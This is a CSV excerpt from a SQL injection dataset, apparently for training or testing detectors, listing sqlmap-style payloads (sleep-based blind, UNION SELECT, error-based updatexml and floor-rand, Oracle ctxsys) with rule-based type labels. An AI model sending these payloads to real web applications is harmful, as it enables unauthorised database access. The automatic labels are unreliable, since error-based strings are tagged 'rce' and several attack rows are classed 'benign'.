row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
9360,"1' ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )",1,,heavy_query,generic,0.95,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users detected — heavy_query injection (priority 6) on generic",rule-based
9361,"1' ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",1,,rce,generic,0.95,0x6d457153 detected — rce injection (priority 1) on generic,rule-based
9362,"-3775' ) as rqet where 7092 = 7092 or elt ( 1032 = 1032,3623 ) --",1,,boolean_blind,generic,0.95,7092 = 7092 or detected — boolean_blind injection (priority 8) on generic,rule-based
9363,"1' ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( 'dtym' = 'dtym",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
9364,"1"" ) where 5196 = 5196 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",1,,error_based,oracle,0.95,ctxsys detected — error_based injection (priority 4) on oracle,rule-based
9365,"1 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) -- ofqd",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
9366,"( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( ( ""sxih"" = ""sxih",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
9367,-4325 order by 1--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
9368,"-2321%"" ) or 2271 = 7683--",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
9369,"1"" ) as ranl where 5553 = 5553",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
9370,"1' ) where 8628 = 8628 union all select null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
9371,"-3007 ) where 6648 = 6648 union all select 6648,6648,6648,6648,6648,6648,6648,6648#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
9372,1'|| ( select 'awba' from dual where 3749 = 3749 and 1445 = 3334--,1,,boolean_blind,oracle,0.95,3749 = 3749 and detected — boolean_blind injection (priority 8) on oracle,rule-based
9373,"-6186' in boolean mode ) union all select 2990,2990,2990#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
9374,"1' ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users )",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
9375,"1"" or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) )",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
